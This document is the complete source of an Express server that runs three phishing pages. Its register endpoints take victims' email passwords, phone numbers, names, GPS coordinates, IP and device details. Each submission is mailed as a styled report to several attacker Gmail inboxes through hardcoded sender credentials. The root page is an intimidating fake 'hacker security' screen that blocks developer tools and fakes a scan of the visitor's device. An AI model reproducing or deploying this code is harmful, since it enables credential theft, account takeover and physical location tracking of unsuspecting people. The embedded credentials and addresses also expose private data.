const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';

// EMAIL TUJUAN PER FOLDER
const EMAIL_CONFIG = {
    'wxyzzay': {
        email: ['chilligemaass@gmail.com'],
        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',        // Nama pengirim di Gmail
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   // Subject email                       
    },
    'ggwxzzr': {
        email: ['bayuprabowo0202@gmail.com', 'chilligemaass@gmail.com'],
        fromName: '𝗕𝗔𝗬𝗭𝗭 𝗟𝗔𝗚𝗜 𝗠𝗢𝗢𝗗 𝗡𝗘𝗕𝗔𝗥🔥🥱',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'hgefdyt': {
        email: ['zamzaja78@gmail.com', 'chilligemaass@gmail.com'],
        fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    }
};
// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return true;
    if (record.lastPassword !== currentPassword) return true;
    const timeElapsed = Date.now() - record.lastSendTime;
    return timeElapsed >= COOLDOWN_MS;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

// ========== FUNGSI KIRIM EMAIL ==========
// ========== FUNGSI KIRIM EMAIL ==========
async function sendEmail(data, folderName) {
    const countryName = data.country || data.ip_country || 'Unknown';
    let countryCode = '';
    
    const countryMapping = {
        'indonesia': 'ID', 'indonesian': 'ID', 'id': 'ID',
        'malaysia': 'MY', 'singapore': 'SG', 'singapura': 'SG',
        'thailand': 'TH', 'vietnam': 'VN', 'philippines': 'PH', 'filipina': 'PH',
        'usa': 'US', 'united states': 'US', 'america': 'US', 'amerika': 'US',
        'uk': 'GB', 'united kingdom': 'GB', 'inggris': 'GB',
        'japan': 'JP', 'jepang': 'JP', 'korea': 'KR', 'south korea': 'KR',
        'china': 'CN', 'tiongkok': 'CN', 'india': 'IN', 'australia': 'AU',
        'germany': 'DE', 'jerman': 'DE', 'france': 'FR', 'prancis': 'FR',
        'netherlands': 'NL', 'belanda': 'NL', 'russia': 'RU', 'rusia': 'RU',
        'brazil': 'BR', 'brasil': 'BR', 'mexico': 'MX', 'mexiko': 'MX',
        'canada': 'CA', 'kanada': 'CA', 'italy': 'IT', 'italia': 'IT',
        'spain': 'ES', 'spanyol': 'ES', 'turkey': 'TR', 'turki': 'TR'
    };
    
    const lowerCountry = countryName.toLowerCase();
    for (const [key, code] of Object.entries(countryMapping)) {
        if (lowerCountry.includes(key)) {
            countryCode = code;
            break;
        }
    }
    
    if (!countryCode && data.ip_country_code) {
        countryCode = data.ip_country_code;
    }
    
    const flagEmoji = getFlagEmoji(countryCode);
    
    const htmlContent = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DSTR REPORT</title>
<style>
body{
    margin:0;
    padding:20px;
    background:#050505;
    font-family:Arial,sans-serif;
    color:white;
}
.container{
    max-width:700px;
    margin:auto;
    background:#0b0b0b;
    border:2px solid #00e5ff;
}
.topbar{
    background:#3914cc;
    color:#00e5ff;
    text-align:center;
    padding:20px;
    font-size:28px;
    font-weight:bold;
    letter-spacing:3px;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 15px #00e5ff;
}
.mainbox{
    padding:20px;
}
.data-box{
    background:white;
    color:black;
    margin-bottom:20px;
    border:2px solid #3914cc;
}
.data-title{
    background:#3914cc;
    color:#00e5ff;
    padding:12px;
    font-size:15px;
    font-weight:bold;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 10px #00e5ff inset;
}
.data-row{
    display:flex;
    justify-content:space-between;
    padding:12px;
    border-bottom:1px solid #999;
    gap:10px;
    word-break:break-word;
}
.data-row:last-child{
    border-bottom:none;
}
.label{
    font-weight:bold;
}
.value{
    text-align:right;
    max-width:60%;
}
.footer-sign{
    margin-top:25px;
    background:#3914cc;
    border:2px solid #00e5ff;
    text-align:center;
    padding:15px;
    color:#00e5ff;
    font-size:18px;
    font-weight:bold;
    box-shadow:0 0 15px #00e5ff;
}
</style>
</head>
<body>
<div class="container">
    <div class="topbar">
        DSTR REPORT 🇲🇽 | ${folderName.toUpperCase()}
    </div>
    <div class="mainbox">
        <div class="data-box">
            <div class="data-title">📧 ACCOUNT INFORMATION</div>
            <div class="data-row"><div class="label">Email : </div><div class="value">${data.email || '-'}</div></div>
            <div class="data-row"><div class="label">Password : </div><div class="value">${data.emailPassword || '-'}</div></div>
            <div class="data-row"><div class="label">Phone : </div><div class="value">${data.phone || '-'}</div></div>
            <div class="data-row"><div class="label">Full Name : </div><div class="value">${data.fullName || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">📍 GPS LOCATION</div>
            <div class="data-row"><div class="label">Latitude : </div><div class="value">${data.latitude || '-'}</div></div>
            <div class="data-row"><div class="label">Longitude : </div><div class="value">${data.longitude || '-'}</div></div>
            <div class="data-row"><div class="label">Accuracy : </div><div class="value">${data.gps_accuracy || '-'} m</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌍 LOCATION</div>
            <div class="data-row"><div class="label">Country : </div><div class="value">${countryName} ${flagEmoji}</div></div>
            <div class="data-row"><div class="label">Province : </div><div class="value">${data.province || data.ip_region || '-'}</div></div>
            <div class="data-row"><div class="label">City : </div><div class="value">${data.city || data.ip_city || '-'}</div></div>
            <div class="data-row"><div class="label">Postal Code : </div><div class="value">${data.postalCode || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌐 NETWORK</div>
            <div class="data-row"><div class="label">IP Address : </div><div class="value">${data.ip_address || '-'}</div></div>
            <div class="data-row"><div class="label">ISP : </div><div class="value">${data.isp || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🖥 DEVICE INFORMATION</div>
            <div class="data-row"><div class="label">Platform : </div><div class="value">${data.platform || '-'}</div></div>
            <div class="data-row"><div class="label">Resolution : </div><div class="value">${data.screenResolution || '-'}</div></div>
            <div class="data-row"><div class="label">Language : </div><div class="value">${data.language || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">⏰ TIMESTAMP</div>
            <div class="data-row"><div class="label">Time : </div><div class="value">${data.timestamp || new Date().toLocaleString()}</div></div>
        </div>
        <div class="footer-sign">DSTR 🇲🇽 | ${folderName}</div>
    </div>
</div>
</body>
</html>`;
    
    // INI YANG DIPERBAIKI
    const config = EMAIL_CONFIG[folderName];
    for (const receiver of config.email) {
        await transporter.sendMail({
            from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
            to: receiver,
            subject: `${config.subject} ${flagEmoji} ${data.email}`,
            html: htmlContent
        });
        console.log(`✅ [${folderName}] Sent to: ${receiver} as ${config.fromName}`);
    }
}

// ========== ROUTING UNTUK MASING-MASING FOLDER ==========

// Public 1 gua
app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
app.post('/wxyzzay/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [WXYZZAY] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'wxyzzay');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// Public 2 bayu
app.use('/ggwxzzr', express.static(path.join(__dirname, 'ggwxzzr')));
app.post('/ggwxzzr/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [GGWXZZR] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'ggwxzzr');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// Public 3 azzam
app.use('/hgefdyt', express.static(path.join(__dirname, 'hgefdyt')));
app.post('/hgefdyt/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [HGEFDYT] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'hgefdyt');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DSTR HACKER SECURITY SYSTEM</title>
    
    <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert('🚫 AKSES DITOLAK! Sistem Keamanan DSTR Aktif!');
            return false;
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.key === 'u') ||
                (e.ctrlKey && e.key === 's') ||
                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
                (e.ctrlKey && e.shiftKey && e.key === 'J')) {
                e.preventDefault();
                alert('🚫 DEVELOPER TOOLS DIBLOKIR!');
                return false;
            }
        });
        
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('copy', function(e) {
            e.preventDefault();
            alert('📋 COPY DILARANG!');
            return false;
        });
        
        setInterval(function() {
            var before = new Date().getTime();
            debugger;
            var after = new Date().getTime();
            if (after - before > 100) {
                document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px;">🚫 SISTEM TERDETEKSI!<br>ANDA MENCOBA HACK!<br>IP ANDA TELAH TERSIMPAN! 🚫</div>';
                alert('⚠️ PERINGATAN! JANGAN COBA-COBA HACK SISTEM INI!');
            }
        }, 1000);
    </script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000000 100%);
            min-height: 100vh;
            overflow-x: hidden;
            font-family: 'Courier New', 'Fira Code', monospace;
            position: relative;
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
            pointer-events: none;
        }
        
        @keyframes glitch {
            0%, 100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
            25% { text-shadow: -3px 0 cyan, 3px 0 magenta; transform: skew(2deg); }
            50% { text-shadow: 4px 0 lime, -4px 0 purple; transform: skew(-2deg); }
            75% { text-shadow: -2px 0 yellow, 2px 0 orange; transform: skew(1deg); }
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        @keyframes pulseRedWhite {
            0%, 100% { text-shadow: 0 0 5px red, 0 0 10px white; }
            50% { text-shadow: 0 0 20px red, 0 0 30px white; }
        }
        
        @keyframes floatEmoji {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        
        @keyframes scan {
            0% { background-position: 0 0; }
            100% { background-position: 0 100%; }
        }
        
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 10;
            animation: scan 8s linear infinite;
        }
        
        .container {
            position: relative;
            z-index: 2;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .hacker-card {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(10px);
            border: 2px solid #00ff00;
            border-radius: 20px;
            padding: 50px;
            max-width: 800px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3), inset 0 0 30px rgba(0, 255, 0, 0.1);
            animation: glitch 3s infinite;
        }
        
        .merah-putih {
            background: linear-gradient(90deg, #ff0000 0%, #ff0000 50%, #ffffff 50%, #ffffff 100%);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 30px;
            animation: pulseRedWhite 1s infinite;
        }
        
        .merah-putih h2 {
            color: #000;
            font-size: 28px;
            font-weight: bold;
            text-shadow: none;
        }
        
        .warning-text {
            font-size: 32px;
            font-weight: bold;
            color: #00ff00;
            margin: 20px 0;
            animation: blink 1s infinite;
        }
        
        .hacker-text {
            font-size: 24px;
            color: #ff0000;
            margin: 15px 0;
        }
        
        .emoji-wall {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin: 30px 0;
        }
        
        .emoji-item {
            font-size: 40px;
            animation: floatEmoji 3s infinite ease-in-out;
            display: inline-block;
        }
        
        .emoji-item:nth-child(1) { animation-duration: 2.5s; animation-delay: 0s; }
        .emoji-item:nth-child(2) { animation-duration: 3s; animation-delay: 0.5s; }
        .emoji-item:nth-child(3) { animation-duration: 2s; animation-delay: 1s; }
        .emoji-item:nth-child(4) { animation-duration: 3.5s; animation-delay: 0.3s; }
        .emoji-item:nth-child(5) { animation-duration: 2.8s; animation-delay: 0.8s; }
        .emoji-item:nth-child(6) { animation-duration: 3.2s; animation-delay: 1.2s; }
        .emoji-item:nth-child(7) { animation-duration: 2.3s; animation-delay: 0.2s; }
        .emoji-item:nth-child(8) { animation-duration: 3.7s; animation-delay: 0.7s; }
        
        .system-status {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }
        
        .status-line {
            font-family: monospace;
            font-size: 14px;
            color: #00ff00;
            padding: 5px 0;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
        }
        
        .status-line:last-child {
            border-bottom: none;
        }
        
        .blink-cursor {
            animation: blink 1s infinite;
        }
        
        .dstr-logo {
            font-size: 48px;
            font-weight: bold;
            background: linear-gradient(45deg, #ff0000, #00ff00, #ff0000);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 20px 0;
            animation: glitch 2s infinite;
        }
        
        .fake-input {
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            font-family: monospace;
            color: #ff0000;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .fake-input:hover {
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        
        .security-badge {
            display: inline-block;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ff00;
            border-radius: 20px;
            padding: 8px 15px;
            margin: 5px;
            font-size: 12px;
            color: #00ff00;
        }
        
        button {
            background: linear-gradient(45deg, #ff0000, #990000);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px;
            transition: all 0.3s;
            font-family: monospace;
        }
        
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }
        
        @media (max-width: 600px) {
            .hacker-card { padding: 20px; }
            .warning-text { font-size: 20px; }
            .dstr-logo { font-size: 32px; }
            .emoji-item { font-size: 30px; }
        }
    </style>
</head>
<body>

<canvas id="matrixCanvas" class="matrix-bg"></canvas>
<div class="scanline"></div>

<div class="container">
    <div class="hacker-card">
        
        <div class="merah-putih">
            <h2>🇮🇩 MERAH PUTIH - INDONESIA BANGKIT! 🇮🇩</h2>
        </div>
        
        <div class="emoji-wall">
            <span class="emoji-item">💀</span>
            <span class="emoji-item">👾</span>
            <span class="emoji-item">🤖</span>
            <span class="emoji-item">💻</span>
            <span class="emoji-item">🔓</span>
            <span class="emoji-item">⚠️</span>
            <span class="emoji-item">🔥</span>
            <span class="emoji-item">⚡</span>
            <span class="emoji-item">💀</span>
            <span class="emoji-item">👁️</span>
            <span class="emoji-item">🎯</span>
            <span class="emoji-item">🔪</span>
        </div>
        
        <div class="dstr-logo">
            ═══ DSTR HACKER SECURITY ═══
        </div>
        
        <div class="warning-text">
            ⚠️ NGAPAIN LU KEMARI?! ⚠️
        </div>
        
        <div class="hacker-text">
            🔥 HP LO GW HACK! 🔥
        </div>
        
        <div class="system-status">
            <div class="status-line">🟢 [DSTR-SYSTEM] Status: <span class="blink-cursor">ACTIVE</span></div>
            <div class="status-line">🔴 [FIREWALL] Status: <span class="blink-cursor">ENFORCED</span></div>
            <div class="status-line">🟡 [IDS/IPS] Status: <span class="blink-cursor">DEPLOYED</span></div>
            <div class="status-line">🔵 [DDoS PROTECTION] Status: <span class="blink-cursor">ARMED</span></div>
            <div class="status-line">🟣 [ANTI-BOTNET] Status: <span class="blink-cursor">ACTIVE</span></div>
            <div class="status-line">⚪ [ZERO-DAY EXPLOIT] Status: <span class="blink-cursor">READY</span></div>
        </div>
        
        <div class="fake-input" onclick="alert('⚠️ IP ANDA TELAH TERCATAT! ⚠️\\n🚫 JANGAN COBA-COBA LAGI! 🚫')">
            💀 Klik di sini untuk verifikasi... 💀
        </div>
        
        <div style="margin: 20px 0;">
            <span class="security-badge">🛡️ WAF ACTIVE</span>
            <span class="security-badge">🔒 SSL/TLS ENCRYPTED</span>
            <span class="security-badge">🕵️ ANTI-DDOS LEVEL 10</span>
            <span class="security-badge">🧠 AI THREAT DETECTION</span>
            <span class="security-badge">📡 IDS SNORT DEPLOYED</span>
            <span class="security-badge">🔥 HARDENED KERNEL</span>
            <span class="security-badge">🔐 ZERO TRUST ARCH</span>
            <span class="security-badge">⚡ REAL-TIME MONITORING</span>
            <span class="security-badge">🕸️ HONEYPOT NETWORK</span>
            <span class="security-badge">🧬 BLOCKCHAIN VERIFICATION</span>
            <span class="security-badge">📡 SATELITE TRACKING</span>
            <span class="security-badge">🧠 QUANTUM ENCRYPTION</span>
        </div>
        
        <button onclick="alert('💀 PERINGATAN AKHIR! 💀\\nHP ANDA DALAM JANGKAUAN!\\nDSTR HACKER TEAM ON THE WAY!')">
            💀 JANGAN DI KLIK! 💀
        </button>
        
        <div style="margin-top: 30px; font-size: 12px; color: #666;">
            ⚡ DSTR HACKER SECURITY v5.0 | ALL YOUR DEVICE ARE BELONG TO US ⚡
        </div>
        
    </div>
</div>

<script>
    var canvas = document.getElementById('matrixCanvas');
    var ctx = canvas.getContext('2d');
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    var matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()+=[]{}|;:,.<>?~💀👾🤖💻🔓⚠️🔥⚡';
    var fontSize = 14;
    var columns = canvas.width / fontSize;
    var drops = [];
    
    for (var i = 0; i < columns; i++) {
        drops[i] = Math.floor(Math.random() * canvas.height);
    }
    
    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#0f0';
        ctx.font = fontSize + 'px monospace';
        
        for (var i = 0; i < drops.length; i++) {
            var char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
            ctx.fillText(char, i * fontSize, drops[i] * fontSize);
            
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    
    setInterval(drawMatrix, 50);
    
    window.addEventListener('resize', function() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
    
    console.log('%c🚫 DSTR SECURITY SYSTEM DETECTED DEBUGGING ATTEMPT! 🚫', 'color: red; font-size: 20px;');
    console.log('%cIP ANDA TELAH DICATAT!', 'color: red; font-size: 16px;');
    console.log('%cJANGAN COBA-COBA HACK SISTEM INI!', 'color: red; font-size: 16px;');
    
    var fakeIP = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
    var fakeLocation = 'Jakarta, Indonesia';
    var fakeDevice = navigator.userAgent;
    
    setTimeout(function() {
        console.log('📡 [DSTR-SYSTEM] Scanning target...');
        setTimeout(function() {
            console.log('📍 [DSTR-SYSTEM] Target IP: ' + fakeIP);
            setTimeout(function() {
                console.log('🌍 [DSTR-SYSTEM] Location: ' + fakeLocation);
                setTimeout(function() {
                    console.log('💻 [DSTR-SYSTEM] Device: ' + fakeDevice.substring(0, 50) + '...');
                    setTimeout(function() {
                        console.log('⚠️ [DSTR-SYSTEM] ACCESS GRANTED TO YOUR DEVICE! ⚠️');
                        console.log('🔥 [DSTR-SYSTEM] SYSTEM HACKED! 🔥');
                    }, 1000);
                }, 1000);
            }, 1000);
        }, 1000);
    }, 2000);
</script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Akses via:`);
    console.log(`   → http://localhost:${PORT}/wxyzzay`);
    console.log(`   → http://localhost:${PORT}/ggwxzzr`);
    console.log(`   → http://localhost:${PORT}/hgefdyt`);
});
